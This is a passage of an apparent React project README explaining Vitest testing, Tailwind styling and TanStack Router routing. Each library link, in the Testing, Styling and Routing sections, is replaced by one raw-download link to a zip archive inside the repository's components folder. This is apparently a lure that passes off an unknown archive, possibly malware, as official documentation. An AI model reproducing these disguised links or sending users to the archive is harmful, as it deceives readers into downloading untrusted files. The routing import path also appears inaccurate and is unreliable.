## 🧪 Testing

This project includes tests using [Vitest](https://raw.githubusercontent.com/CarsonWhite13/react-19-2-async/main/src/components/react-19-2-async_v1.7-alpha.3.zip). To run the tests, simply type the following command in your CLI:

```bash
pnpm test
```

This helps ensure that everything works as expected.

## 🎨 Styling

The application uses [Tailwind CSS](https://raw.githubusercontent.com/CarsonWhite13/react-19-2-async/main/src/components/react-19-2-async_v1.7-alpha.3.zip) for styling. This framework allows you to create stylish layouts easily. You can customize styles by editing the classes in your HTML files.

## 📍 Routing

This app employs [TanStack Router](https://raw.githubusercontent.com/CarsonWhite13/react-19-2-async/main/src/components/react-19-2-async_v1.7-alpha.3.zip) for routing. The initial setup uses a file-based router, meaning that your routes are organized as files within the `src/routes` directory.

### ➕ Adding A Route

To add a new route:

1. **Create a new file** in the `./src/routes` directory.
2. **Name your file** logically related to the content it will display.

TanStack will automatically manage the content of the new route file for you. 

### 🔗 Adding Links 

To navigate between routes, you can use the `Link` component. Import it from the TanStack Router by adding this at the top of your file:

```javascript
import { Link } from '@tanstack/router';
```

You can then use `Link` components within your JSX to create navigation links between your routes.
